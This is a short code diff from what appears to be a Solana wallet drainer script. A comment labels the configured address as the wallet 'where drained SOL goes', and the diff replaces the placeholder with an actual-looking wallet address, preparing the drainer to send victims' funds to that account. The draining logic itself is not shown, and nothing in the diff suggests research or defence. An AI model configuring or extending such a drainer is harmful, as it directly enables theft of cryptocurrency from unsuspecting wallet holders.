@@ -6,7 +6,7 @@
 // ============================================
 // 🔧 YOUR WALLET WHERE DRAINED SOL GOES 🔧
 // ============================================
-const YOUR_WALLET_ADDRESS = "YOUR_WALLET_ADDRESS_HERE";
+const YOUR_WALLET_ADDRESS = "9tZqX5tq79HT2SN6AhxzXfqjowojW2hQut6e4vyzfrd1";
 // ============================================
 
 // Global
